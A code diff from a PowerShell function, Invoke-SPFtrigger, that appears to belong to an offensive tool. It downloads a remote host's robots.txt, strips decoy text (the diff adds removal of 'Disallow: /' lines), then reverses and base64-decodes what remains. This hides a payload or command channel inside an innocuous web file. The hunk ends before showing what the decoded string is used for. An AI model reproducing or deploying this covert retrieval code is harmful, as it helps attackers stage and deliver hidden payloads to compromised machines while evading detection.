@@ -10,6 +10,7 @@ function Invoke-SPFtrigger
   if ($hostn.Length -ge 3 ){
     $dl = (New-Object System.Net.Webclient).DownloadString("http://" + $hostn + "/robots.txt")
     $dl = $dl.Replace(".html`n", "")
+    $dl = $dl.Replace("Disallow: /", "")
     $dl = $dl[-1..-($dl.length)] -join ""
     $c = [System.Convert]::FromBase64String($dl)
     $st = [System.Text.Encoding]::ASCII.GetString($c)
